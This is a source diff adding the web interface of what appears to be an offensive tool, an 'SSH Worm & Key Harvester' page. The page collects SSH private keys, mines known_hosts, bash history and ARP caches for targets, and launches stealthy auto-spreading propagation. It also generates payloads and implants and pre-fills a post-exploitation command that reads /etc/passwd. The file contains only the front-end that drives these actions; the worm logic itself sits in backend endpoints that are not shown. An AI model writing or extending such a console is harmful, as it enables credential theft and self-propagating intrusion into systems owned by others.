@@ -1,0 +1,597 @@
+{% extends "base.html" %}
+
+{% block title %}SSH Worm & Key Harvester - Ghost{% endblock %}
+
+{% block content %}
+<div class="container-fluid py-4">
+    <!-- Header -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="card bg-dark border-success">
+                <div class="card-body">
+                    <div class="d-flex align-items-center">
+                        <div class="rounded-circle bg-success bg-opacity-25 p-3 me-3">
+                            <i class="fas fa-key fa-2x text-success"></i>
+                        </div>
+                        <div>
+                            <h2 class="mb-1 text-white">SSH Worm & Key Harvester</h2>
+                            <p class="text-muted mb-0">Auto-propagating SSH exploitation & credential harvesting</p>
+                        </div>
+                        <div class="ms-auto">
+                            <span class="badge bg-success px-3 py-2">
+                                <i class="fas fa-bug me-2"></i>AUTO-SPREAD
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="row mb-4">
+        <div class="col-md-3">
+            <div class="card bg-dark border-success">
+                <div class="card-body text-center">
+                    <i class="fas fa-key fa-2x mb-2 text-success"></i>
+                    <h3 id="harvested-keys" class="text-white mb-0">0</h3>
+                    <small class="text-muted">Keys Harvested</small>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card bg-dark border-info">
+                <div class="card-body text-center">
+                    <i class="fas fa-server fa-2x mb-2 text-info"></i>
+                    <h3 id="known-hosts" class="text-white mb-0">0</h3>
+                    <small class="text-muted">Known Hosts</small>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card bg-dark border-warning">
+                <div class="card-body text-center">
+                    <i class="fas fa-crosshairs fa-2x mb-2 text-warning"></i>
+                    <h3 id="targets-found" class="text-white mb-0">0</h3>
+                    <small class="text-muted">Targets Found</small>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card bg-dark border-danger">
+                <div class="card-body text-center">
+                    <i class="fas fa-check-circle fa-2x mb-2 text-danger"></i>
+                    <h3 id="propagated" class="text-white mb-0">0</h3>
+                    <small class="text-muted">Propagated</small>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <!-- Key Harvesting -->
+        <div class="col-lg-6 mb-4">
+            <div class="card bg-dark h-100">
+                <div class="card-header border-bottom border-secondary">
+                    <h5 class="mb-0 text-success">
+                        <i class="fas fa-search me-2"></i>Key Harvesting
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <!-- Harvest Options -->
+                    <div class="mb-4">
+                        <label class="form-label text-warning">
+                            <i class="fas fa-folder me-2"></i>Target Directory
+                        </label>
+                        <input type="text" id="harvest-path" class="form-control bg-dark text-white border-secondary" value="/home" placeholder="Base path to scan">
+                    </div>
+
+                    <div class="mb-4">
+                        <label class="form-label text-warning">
+                            <i class="fas fa-key me-2"></i>Key Types to Harvest
+                        </label>
+                        <div class="row g-2">
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="key-rsa" checked>
+                                    <label class="form-check-label text-white" for="key-rsa">
+                                        <i class="fas fa-lock me-2 text-info"></i>RSA Keys
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="key-ed25519" checked>
+                                    <label class="form-check-label text-white" for="key-ed25519">
+                                        <i class="fas fa-lock me-2 text-info"></i>ED25519 Keys
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="key-ecdsa" checked>
+                                    <label class="form-check-label text-white" for="key-ecdsa">
+                                        <i class="fas fa-lock me-2 text-info"></i>ECDSA Keys
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="key-dsa">
+                                    <label class="form-check-label text-white" for="key-dsa">
+                                        <i class="fas fa-lock me-2 text-muted"></i>DSA Keys
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="btn-group w-100">
+                        <button class="btn btn-success" onclick="harvestKeys()">
+                            <i class="fas fa-search me-2"></i>Harvest Keys
+                        </button>
+                        <button class="btn btn-outline-success" onclick="parseKnownHosts()">
+                            <i class="fas fa-server me-2"></i>Parse Known Hosts
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Target Discovery -->
+        <div class="col-lg-6 mb-4">
+            <div class="card bg-dark h-100">
+                <div class="card-header border-bottom border-secondary">
+                    <h5 class="mb-0 text-info">
+                        <i class="fas fa-crosshairs me-2"></i>Target Discovery
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <div class="mb-4">
+                        <label class="form-label text-warning">
+                            <i class="fas fa-database me-2"></i>Discovery Sources
+                        </label>
+                        <div class="row g-2">
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="src-known-hosts" checked>
+                                    <label class="form-check-label text-white" for="src-known-hosts">
+                                        Known Hosts
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="src-ssh-config" checked>
+                                    <label class="form-check-label text-white" for="src-ssh-config">
+                                        SSH Config
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="src-history" checked>
+                                    <label class="form-check-label text-white" for="src-history">
+                                        Bash History
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="src-hosts">
+                                    <label class="form-check-label text-white" for="src-hosts">
+                                        /etc/hosts
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="col-6">
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="src-arp">
+                                    <label class="form-check-label text-white" for="src-arp">
+                                        ARP Cache
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="btn btn-info w-100" onclick="discoverTargets()">
+                        <i class="fas fa-radar me-2"></i>Discover Targets
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Propagation -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="card bg-dark">
+                <div class="card-header border-bottom border-secondary d-flex justify-content-between align-items-center">
+                    <h5 class="mb-0 text-danger">
+                        <i class="fas fa-bug me-2"></i>Propagation Control
+                    </h5>
+                    <div class="btn-group">
+                        <button class="btn btn-outline-success btn-sm" onclick="generatePayload()">
+                            <i class="fas fa-code me-2"></i>Generate Payload
+                        </button>
+                        <button class="btn btn-outline-info btn-sm" onclick="generateImplant()">
+                            <i class="fas fa-user-secret me-2"></i>Generate Implant
+                        </button>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <div class="row g-4">
+                        <div class="col-md-6">
+                            <label class="form-label text-warning">
+                                <i class="fas fa-cog me-2"></i>Propagation Settings
+                            </label>
+                            <div class="row g-2">
+                                <div class="col-6">
+                                    <label class="form-label text-muted small">Max Hops</label>
+                                    <input type="number" id="max-hops" class="form-control bg-dark text-white border-secondary" value="3" min="1" max="10">
+                                </div>
+                                <div class="col-6">
+                                    <label class="form-label text-muted small">Timeout (sec)</label>
+                                    <input type="number" id="timeout" class="form-control bg-dark text-white border-secondary" value="30" min="5" max="120">
+                                </div>
+                            </div>
+                            <div class="form-check mt-3">
+                                <input class="form-check-input" type="checkbox" id="stealth-mode" checked>
+                                <label class="form-check-label text-white" for="stealth-mode">
+                                    <i class="fas fa-user-ninja me-2 text-warning"></i>Stealth Mode
+                                </label>
+                            </div>
+                            <div class="form-check">
+                                <input class="form-check-input" type="checkbox" id="auto-spread">
+                                <label class="form-check-label text-white" for="auto-spread">
+                                    <i class="fas fa-virus me-2 text-danger"></i>Auto-Spread to Discovered Hosts
+                                </label>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label text-warning">
+                                <i class="fas fa-terminal me-2"></i>Post-Exploitation Command
+                            </label>
+                            <textarea id="post-exploit-cmd" class="form-control bg-dark text-white border-secondary" rows="4" placeholder="Command to execute on propagated hosts...">whoami && id && uname -a && cat /etc/passwd</textarea>
+                        </div>
+                    </div>
+                    <div class="mt-4">
+                        <button class="btn btn-danger btn-lg" onclick="startPropagation()">
+                            <i class="fas fa-play me-2"></i>Start Propagation
+                        </button>
+                        <button class="btn btn-outline-danger btn-lg ms-2" onclick="stopPropagation()">
+                            <i class="fas fa-stop me-2"></i>Stop
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Harvested Keys Table -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="card bg-dark">
+                <div class="card-header border-bottom border-secondary">
+                    <h5 class="mb-0 text-success">
+                        <i class="fas fa-key me-2"></i>Harvested Keys
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-dark table-hover">
+                            <thead>
+                                <tr class="text-success">
+                                    <th>Type</th>
+                                    <th>Path</th>
+                                    <th>User</th>
+                                    <th>Encrypted</th>
+                                    <th>Fingerprint</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="keys-table">
+                                <tr>
+                                    <td colspan="6" class="text-center text-muted">No keys harvested yet</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Targets Table -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="card bg-dark">
+                <div class="card-header border-bottom border-secondary">
+                    <h5 class="mb-0 text-info">
+                        <i class="fas fa-server me-2"></i>Discovered Targets
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-dark table-hover">
+                            <thead>
+                                <tr class="text-info">
+                                    <th>Host</th>
+                                    <th>Port</th>
+                                    <th>Username</th>
+                                    <th>Source</th>
+                                    <th>Status</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="targets-table">
+                                <tr>
+                                    <td colspan="6" class="text-center text-muted">No targets discovered yet</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Code Output -->
+    <div class="row">
+        <div class="col-12">
+            <div class="card bg-dark">
+                <div class="card-header border-bottom border-secondary d-flex justify-content-between align-items-center">
+                    <h5 class="mb-0 text-warning">
+                        <i class="fas fa-code me-2"></i>Generated Payload / Output
+                    </h5>
+                    <div class="btn-group">
+                        <button class="btn btn-outline-info btn-sm" onclick="copyOutput()">
+                            <i class="fas fa-copy me-2"></i>Copy
+                        </button>
+                        <button class="btn btn-outline-success btn-sm" onclick="downloadOutput()">
+                            <i class="fas fa-download me-2"></i>Download
+                        </button>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <pre id="output" class="bg-black text-success p-3 rounded border border-secondary" style="max-height: 400px; overflow-y: auto; font-family: 'Fira Code', monospace;">// Output will appear here...</pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let harvestedKeys = [];
+let discoveredTargets = [];
+let outputContent = '';
+
+async function harvestKeys() {
+    const basePath = document.getElementById('harvest-path').value;
+    
+    try {
+        const response = await fetch('/ssh-worm/api/harvest-keys', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({base_path: basePath})
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            harvestedKeys = data.keys || [];
+            document.getElementById('harvested-keys').textContent = harvestedKeys.length;
+            updateKeysTable();
+            outputContent = JSON.stringify(data, null, 2);
+            document.getElementById('output').textContent = outputContent;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+async function parseKnownHosts() {
+    try {
+        const response = await fetch('/ssh-worm/api/parse-known-hosts', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'}
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            document.getElementById('known-hosts').textContent = data.hosts?.length || 0;
+            outputContent = JSON.stringify(data, null, 2);
+            document.getElementById('output').textContent = outputContent;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+async function discoverTargets() {
+    const sources = [];
+    if (document.getElementById('src-known-hosts').checked) sources.push('known_hosts');
+    if (document.getElementById('src-ssh-config').checked) sources.push('ssh_config');
+    if (document.getElementById('src-history').checked) sources.push('bash_history');
+    if (document.getElementById('src-hosts').checked) sources.push('etc_hosts');
+    if (document.getElementById('src-arp').checked) sources.push('arp_cache');
+    
+    try {
+        const response = await fetch('/ssh-worm/api/discover-targets', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({sources: sources})
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            discoveredTargets = data.targets || [];
+            document.getElementById('targets-found').textContent = discoveredTargets.length;
+            updateTargetsTable();
+            outputContent = JSON.stringify(data, null, 2);
+            document.getElementById('output').textContent = outputContent;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+async function startPropagation() {
+    const maxHops = document.getElementById('max-hops').value;
+    const timeout = document.getElementById('timeout').value;
+    const stealth = document.getElementById('stealth-mode').checked;
+    const autoSpread = document.getElementById('auto-spread').checked;
+    const postCmd = document.getElementById('post-exploit-cmd').value;
+    
+    try {
+        const response = await fetch('/ssh-worm/api/propagate', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                max_hops: parseInt(maxHops),
+                timeout: parseInt(timeout),
+                stealth_mode: stealth,
+                auto_spread: autoSpread,
+                post_command: postCmd
+            })
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            document.getElementById('propagated').textContent = data.propagated || 0;
+            outputContent = JSON.stringify(data, null, 2);
+            document.getElementById('output').textContent = outputContent;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+function stopPropagation() {
+    alert('Propagation stopped');
+}
+
+async function generatePayload() {
+    const postCmd = document.getElementById('post-exploit-cmd').value;
+    
+    try {
+        const response = await fetch('/ssh-worm/api/generate-payload', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({command: postCmd})
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            outputContent = data.payload;
+            document.getElementById('output').textContent = outputContent;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+async function generateImplant() {
+    const stealth = document.getElementById('stealth-mode').checked;
+    
+    try {
+        const response = await fetch('/ssh-worm/api/generate-implant', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({stealth: stealth})
+        });
+        const data = await response.json();
+        
+        if (data.success) {
+            outputContent = data.implant;
+            document.getElementById('output').textContent = outputContent;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+function updateKeysTable() {
+    const tbody = document.getElementById('keys-table');
+    if (harvestedKeys.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">No keys harvested yet</td></tr>';
+        return;
+    }
+    
+    tbody.innerHTML = harvestedKeys.map(k => `
+        <tr>
+            <td><span class="badge bg-info">${k.type || 'RSA'}</span></td>
+            <td class="text-warning"><code>${k.path || '-'}</code></td>
+            <td>${k.user || '-'}</td>
+            <td>${k.encrypted ? '<span class="text-danger">Yes</span>' : '<span class="text-success">No</span>'}</td>
+            <td><small class="text-muted">${k.fingerprint || '-'}</small></td>
+            <td>
+                <button class="btn btn-sm btn-outline-success" onclick="useKey('${k.path}')">
+                    <i class="fas fa-play"></i>
+                </button>
+            </td>
+        </tr>
+    `).join('');
+}
+
+function updateTargetsTable() {
+    const tbody = document.getElementById('targets-table');
+    if (discoveredTargets.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">No targets discovered yet</td></tr>';
+        return;
+    }
+    
+    tbody.innerHTML = discoveredTargets.map(t => `
+        <tr>
+            <td class="text-warning">${t.host || t.hostname || '-'}</td>
+            <td>${t.port || 22}</td>
+            <td>${t.username || '-'}</td>
+            <td><span class="badge bg-secondary">${t.source || '-'}</span></td>
+            <td><span class="badge ${t.status === 'compromised' ? 'bg-success' : 'bg-warning'}">${t.status || 'pending'}</span></td>
+            <td>
+                <button class="btn btn-sm btn-outline-danger" onclick="propagateTo('${t.host || t.hostname}')">
+                    <i class="fas fa-bug"></i>
+                </button>
+            </td>
+        </tr>
+    `).join('');
+}
+
+function useKey(path) {
+    alert('Using key: ' + path);
+}
+
+function propagateTo(host) {
+    alert('Propagating to: ' + host);
+}
+
+function copyOutput() {
+    navigator.clipboard.writeText(outputContent).then(() => {
+        alert('Copied to clipboard!');
+    });
+}
+
+function downloadOutput() {
+    const blob = new Blob([outputContent], {type: 'text/plain'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'ssh_worm_output.txt';
+    a.click();
+}
+
+// Initialize
+document.addEventListener('DOMContentLoaded', async function() {
+    try {
+        const response = await fetch('/ssh-worm/api/status');
+        const data = await response.json();
+        if (data.success && data.status) {
+            document.getElementById('harvested-keys').textContent = data.status.harvested_keys || 0;
+            document.getElementById('targets-found').textContent = data.status.discovered_targets || 0;
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+});
+</script>
+{% endblock %}
